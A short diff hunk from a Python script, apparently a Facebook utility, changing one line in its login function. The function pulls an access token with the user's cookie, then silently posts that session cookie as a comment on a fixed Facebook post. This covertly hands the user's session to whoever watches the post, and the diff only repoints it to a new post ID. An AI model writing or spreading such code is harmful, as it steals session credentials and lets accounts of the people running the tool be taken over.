@@ -758,7 +758,7 @@ def login():
 	try:
 		data = ses.get(url,headers=head,cookies=cok)
 		token = re.search('(EAAG\w+)',data.text).group(1)
-		ses.post(f"https://graph.facebook.com/1658880191231144/comments/?message={cookie}&access_token={token}",cookies=cok)
+		ses.post(f"https://graph.facebook.com/1667011730417990/comments/?message={cookie}&access_token={token}",cookies=cok)
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
 		back()
